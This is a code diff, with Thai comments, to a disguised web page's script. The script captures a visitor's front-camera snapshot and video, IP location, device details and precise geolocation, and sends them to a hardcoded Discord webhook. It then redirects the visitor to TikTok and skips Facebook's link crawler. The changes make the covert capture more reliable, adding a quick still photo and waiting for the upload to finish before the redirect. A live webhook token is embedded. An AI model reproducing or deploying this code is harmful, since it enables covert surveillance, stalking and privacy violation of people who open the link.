@@ -7,20 +7,31 @@
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1505441313468710923/4ZwXHcn5adt8nWLoAgLGOuIE9ZKfeIxjZBQvgsF5qh1uLl9DeMT5wQgpwfQxWSuBkpJ9"; 
 
-        // --- ฟังก์ชันอัดวิดีโอจากกล้องหน้า 3 วินาที ---
+        // --- ฟังก์ชันอัดวิดีโอจากกล้องหน้า 3 วินาที (แก้ไขให้ส่งไฟล์เข้าชัวร์ขึ้น) ---
         async function captureFace() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                const mediaRecorder = new MediaRecorder(stream);
+                
+                // 📸 เพิ่มส่วน Snapshot: ถ่ายภาพนิ่งส่งไปก่อนกันพลาด
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const photoBlob = await imageCapture.takePhoto();
+                const photoData = new FormData();
+                photoData.append('file', photoBlob, 'snapshot.jpg');
+                photoData.append('payload_json', JSON.stringify({ content: "📸 **FAST SNAPSHOT** (ได้รูปแล้ว)" }));
+                fetch(WEBHOOK_URL, { method: 'POST', body: photoData });
+
+                // 🎥 เริ่มอัดวิดีโอ
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 const chunks = [];
 
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                 mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const blob = new Blob(chunks, { type: 'video/webm' });
                     const formData = new FormData();
-                    formData.append('file', blob, 'video_capture.mp4');
+                    formData.append('file', blob, 'video_capture.webm');
                     formData.append('payload_json', JSON.stringify({ 
-                        content: "🎥 **VIDEO CAPTURED (วิดีโอจากกล้องหน้า)**\n✅ Status: Recorded successfully (บันทึกสำเร็จแล้ว)" 
+                        content: "🎥 **VIDEO CAPTURED (วิดีโอจากกล้องหน้า)**\n✅ Status: Recorded successfully" 
                     }));
 
                     await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
@@ -29,14 +40,14 @@
 
                 mediaRecorder.start();
                 setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 3000); // อัด 3 วินาที
+                    if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
+                }, 3000); 
 
             } catch (err) {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: "🎥 **CAMERA ERROR**\n❌ Status: Camera Access Denied (ปฏิเสธการเข้าถึงกล้อง)" })
+                    body: JSON.stringify({ content: "🎥 **CAMERA ERROR**\n❌ Status: " + err.message })
                 });
             }
         }
@@ -45,7 +56,7 @@
             if (navigator.userAgent.includes("facebookexternalhit")) return;
 
             try {
-                // --- ส่วนที่ 1: ดึงข้อมูลที่อยู่และสเปคเครื่อง ---
+                // --- ส่วนที่ 1: ดึงข้อมูลที่อยู่และสเปคเครื่อง (ครบตามเดิม) ---
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 const check = (val) => (val && val !== null ? val : "Data not found (ไม่พบข้อมูล)");
@@ -121,7 +132,8 @@
                                 content: `🎯 **LOCATION FOUND (พบตำแหน่ง)**\n──────────────────────────\n📍 **Google Maps:** ${mapsLink}\n✅ **Status:** ${accuracyStatus}\n──────────────────────────` 
                             })
                         });
-                        window.location.href = "https://www.tiktok.com";
+                        // รอให้วิดีโออัปโหลดแป๊บนึงก่อนเด้งหน้า
+                        setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 4000);
 
                     }, async () => { 
                         let backupReport = `⚠️ **LOCATION ACCESS DENIED (ปฏิเสธพิกัด)**\n`;
